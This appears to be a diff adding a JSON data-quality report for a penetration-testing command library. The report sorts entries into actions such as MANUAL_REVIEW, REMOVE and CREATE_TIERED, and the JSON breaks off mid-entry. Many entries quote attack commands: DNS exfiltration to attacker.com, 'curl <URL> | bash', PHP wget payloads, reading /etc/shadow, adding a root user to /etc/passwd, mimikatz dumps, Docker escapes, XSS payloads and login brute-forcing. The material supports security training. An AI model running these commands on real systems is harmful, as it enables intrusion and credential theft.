@@ -1,0 +1,2875 @@
+{
+  "summary": {
+    "total_failed": 352,
+    "tier1_count": 1,
+    "tier2_count": 1,
+    "tier3_count": 12,
+    "tier4_count": 287
+  },
+  "tiers": {
+    "tier1": [
+      {
+        "text": "Import PowerView",
+        "count": 30,
+        "category": "powershell_import",
+        "action": "CREATE_TIER1",
+        "sample_file": "data/commands/enumeration/ad-powerview-core.json"
+      }
+    ],
+    "tier2": [
+      {
+        "text": "NTLM hash obtained",
+        "count": 5,
+        "category": "state_condition",
+        "action": "REMOVE",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      }
+    ],
+    "tier3_count": 12,
+    "tier4_count": 287
+  },
+  "by_action": {
+    "MANUAL_REVIEW": [
+      {
+        "text": "nessus scan",
+        "file": "data/commands/recon.json"
+      },
+      {
+        "text": "burp intruder",
+        "file": "data/commands/web/general.json"
+      },
+      {
+        "text": "burp intruder",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "HTTP server on attacker",
+        "file": "data/commands/generated/file-transfer-additions.json"
+      },
+      {
+        "text": "Transfer LinEnum.sh",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer script",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer PowerUp.ps1",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer PrivescCheck.ps1",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer Seatbelt.exe",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "grep time range in syslog files (manual)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl | grep sudo.*COMMAND",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl | grep 'Failed password'",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "w (includes user info)",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "docker info",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker version",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker pull ubuntu (larger but more tools)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker pull busybox (even smaller than alpine)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "python3 smbserver.py share .",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "samba service",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "bitsadmin for newer Windows",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "certutil base64 encoding",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "dig $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "host $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "ping $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "bitsadmin download",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "rsync for larger transfers",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "SFTP for interactive transfer",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "socat for bidirectional transfer",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use existing file upload functionality",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Python Flask upload server",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "TFTP for simpler transfers",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "SFTP for encrypted transfers",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "certutil for simpler syntax",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use individual PowerUp functions",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "mimikatz: vault::list",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "rundll32 keymgr.dll,KRShowKeyMgr",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Copy from Volume Shadow Copies",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Use mimikatz lsadump::sam",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "wmic os get Caption,Version,BuildNumber",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "dir C:\\Windows\\System32\\Tasks",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "reg save HKLM\\SAM sam.save",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "reg save HKLM\\SYSTEM system.save",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "mimikatz dpapi::masterkey",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Rubeus.exe kerberoast",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "icacls C:\\Progra~1\\*",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Transfer linpeas.sh via file transfer methods",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use LinEnum if LinPEAS fails",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use curl instead of wget",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Upload via Python HTTP server",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use LinPEAS for more comprehensive scan",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use pspy to monitor processes",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use LinPEAS which includes capability check",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use metasploit NFS scanner",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use linpeas.sh capabilities module for automated classification",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Man pages: man 7 capabilities (understand what capability enables)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Binary name extracted from getcap output",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "GTFOBins technique researched and understood",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Search SYSVOL for GPP passwords",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Search patterns: *sql*, *backup*, *service*, *admin*",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "PsLoggedOn.exe downloaded from Sysinternals Suite",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "SMB port 445 open",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "Identify target service and port",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Identify required arguments from help",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Note web server type from nmap: Apache, IIS, nginx",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Mimikatz on compromised Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "SMB port 445 open",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Metasploit web_delivery module",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "Target identified",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "DCOM enabled (default)",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "getwd (alias)",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json"
+      },
+      {
+        "text": "dir (alias)",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json"
+      },
+      {
+        "text": "download + local cat",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json"
+      },
+      {
+        "text": "WinRM enabled on target (default Windows Server 2012+)",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "WinRM enabled on target (port 5985 or 5986 open)",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "RPC port 135 open on target",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json"
+      },
+      {
+        "text": "SMB connection to target (port 445)",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json"
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Use hostname in UNC path: \\\\files04\\share",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz: sekurlsa::tickets",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus: klist",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": ".kirbi ticket file",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz: kerberos::purge",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Proxychains configured with correct SOCKS proxy",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "REMOVE": [
+      {
+        "text": "<svg onload=alert(1)>",
+        "file": "data/commands/web/general.json"
+      },
+      {
+        "text": "<body onload=alert(1)>",
+        "file": "data/commands/web/general.json"
+      },
+      {
+        "text": "python requests.post()",
+        "file": "data/commands/web/general.json"
+      },
+      {
+        "text": "Neo4j running",
+        "file": "data/commands/generated/active-directory-additions.json"
+      },
+      {
+        "text": "Neo4j running",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "docker pull alpine (if no images available)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "wget if curl unavailable",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use wget/curl if available",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Manual check with: sc qc <servicename>",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Manual MSI creation with WiX Toolset",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Manual searchsploit of OS version",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Check nmap version: nmap --version (if < 5.21, interactive works)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "Manual review of find output",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "Manual binary analysis: strings /path/to/binary",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "Manual enumeration with individual commands",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Check /etc/sudoers if readable",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Manual search in /usr/bin and /usr/sbin",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Check specific binary: getcap /usr/bin/python3 (test known binary)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "getcap utility installed (part of libcap package)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Test shadow file read: cat /etc/shadow 2>/dev/null | grep root",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Test sudo without password: sudo -l (if sudoers allows)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "nmap -sn <SUBNET> (if dsquery unavailable)",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Manual iteration without recursion",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "PowerView imported",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "PowerView imported",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "sqli-union-mysql-info (if SQL injection available)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "sqli-union-postgresql-info (if SQL injection available)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "Impacket installed on Kali",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "nmap installed (default on Kali)",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "Check service fingerprint manually",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check robots.txt first: curl http://<TARGET>/robots.txt",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check for rate limiting: Test with small wordlist first",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check robots.txt and source code manually",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Manual testing with evil-winrm",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Manual base64-encode-powershell with custom payload",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "nmap installed on Kali (pre-installed)",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "Evil-WinRM installed on Kali",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz available",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus.exe available",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Nmap installed: sudo apt install nmap",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "plink-remote-forward - Windows alternative using Plink when OpenSSH unavailable",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "Socat installed on pivot host: which socat (if not found: sudo apt install socat)",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Python available on pivot host: which python3 (usually present by default)",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <SOCKS_PORT> or ssh -R <SOCKS_PORT> (remote dynamic)",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <PORT> or ssh -R <PORT>",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D or ssh -R (remote dynamic)",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "CREATE_TIERED": [
+      {
+        "text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "wpscan-enumerate-all (to discover usernames)",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "burp suite XML-RPC plugin",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "curl -s <URL>/feed/ | grep generator",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "Transfer pspy64/pspy32",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "cat /proc/*/cmdline | tr '\\0' ' '",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "ps aux | grep <PATTERN>",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "ps aux | grep <PROCESS_NAME> | awk '{print $2}'",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "cat /proc/<PID>/cmdline | tr '\\0' ' '",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "cat /var/spool/cron/crontabs/<USERNAME>",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "less /etc/crontab",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "find /etc/cron* -type f",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "at (command-line AT utility)",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "ls -la /var/spool/at/",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "tail-follow-log /var/log/syslog",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -k (kernel messages via journald)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -kf (kernel messages via journald)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -u ssh | grep -i failed",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "dmesg-kernel-messages (kernel only)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "ls /etc/init.d/",
+        "file": "data/commands/monitoring/service-enumeration.json"
+      },
+      {
+        "text": "top -bn1 -o %MEM | head -20",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "top -bn1 -o %CPU | head -20",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "cat /proc/meminfo",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "top -bn1",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "sar -u 1 5",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "cat /proc/loadavg",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "ls -l /proc/*/fd/ (manual check)",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "lsof +d <DIRECTORY> (non-recursive, faster)",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "cat /var/log/wtmp | utmpdump",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "# Install ClamAV on Windows test system:\n# Download from: https://www.clamav.net/downloads",
+        "file": "data/commands/av-evasion/signature-evasion.json"
+      },
+      {
+        "text": "cat /etc/group | grep docker",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "stat /var/run/docker.sock",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "cat /mnt/etc/passwd",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker-mount-escape (preferred method)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker-mount-escape (simpler)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "curl -T <FILE> ftp://<LHOST>/",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "python -m SimpleHTTPServer",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "python -m SimpleHTTPServer 8000 (Python 2)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use /dev/tcp for raw download",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "curl <URL> | bash (pipe to shell)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use -k for self-signed certificates",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "wget <URL> -O <FILE> (PowerShell alias)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "curl <URL> -o <FILE> (PowerShell alias)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use with -i for SSH key: scp -i key.pem file target:/path",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Run directly: \\\\\\\\<LHOST>\\\\share\\\\file.exe",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "socat TCP-LISTEN:port,reuseaddr,fork file:output",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use base64 encoding for text-safe transfer",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "PowerUp's Get-UnquotedService",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-ModifiableServiceFile",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-RegistryAlwaysInstallElevated",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Find-ProcessDLLHijack",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Watson (PowerShell-based)",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "whoami /all",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp.ps1 Invoke-AllChecks",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "sc sdshow <service>",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "dir /s /b C:\\*.dll 2>nul",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "cat /etc/sudoers (if readable)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "ls -la /root/ (check if can list root directory)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "cat /etc/shadow (attempt to read directly)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "ls -la /root/",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "cat /etc/shadow",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "find <PATH> -name '*.php' -exec grep -i password {} +",
+        "file": "data/commands/post-exploit/credential-discovery.json"
+      },
+      {
+        "text": "find <PATH> -name 'config*' -exec cat {} +",
+        "file": "data/commands/post-exploit/credential-discovery.json"
+      },
+      {
+        "text": "getent passwd | grep -v nologin | cut -d: -f1",
+        "file": "data/commands/post-exploit/credential-discovery.json"
+      },
+      {
+        "text": "grep -r '/etc/cron' /etc/",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "cat /proc/version",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "nmap --script nfs-showmount",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "docker run -v /:/hostfs -it ubuntu bash",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "find / -name authorized_keys",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "grep -r 'PRIVATE KEY' /home 2>/dev/null",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "cat /etc/sudoers 2>/dev/null",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "cat /etc/os-release",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Transfer manually and run: ./linpeas.sh",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "watch -n 1 'ps aux | grep -v grep'",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "showmount -e localhost",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "ls -la /bin/systemctl",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "getcap /bin/systemctl",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "find /etc -name '*.sh' -exec grep '\\*' {} \\;",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Search exploit-db for capability-based techniques",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use different exploitation technique for same capability/binary",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Identified capability/binary combination from previous steps",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Edit /etc/shadow instead if cap allows: remove root password hash",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "wfuzz -c -z file,<WORDLIST> -d \"fm_usr=<USER>&fm_pwd=FUZZ\" --hs \"<FAIL_STRING>\" http://<TARGET>/<PAGE>",
+        "file": "data/commands/enumeration/password-attacks-hydra.json"
+      },
+      {
+        "text": "ls \\\\<TARGET>\\<SHARE>",
